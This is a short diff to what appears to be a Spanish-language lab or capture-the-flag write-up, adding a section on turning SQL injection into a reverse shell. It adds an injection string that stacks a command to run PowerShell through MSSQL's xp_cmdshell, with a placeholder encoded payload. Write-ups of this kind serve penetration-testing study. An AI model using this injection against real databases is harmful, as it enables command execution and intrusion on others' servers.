@@ -208,5 +208,10 @@ podemos encontrar `XSS` y `SQLi`  panel de administración, y sabemos que este e
 |                             |                                                                             |      |       |                                                                                                                                      |
 
 ### SQLI reverse shell
-aprovecharemos `SQLI` esta ejecución  
+aprovecharemos `SQLI` para ejecutar nuestro payload
+
+```python
+3'; use master; exec xp_cmdshell 'powershell -e t';-- -
+```
+
 ![[Pasted image 20240705144840.png]]
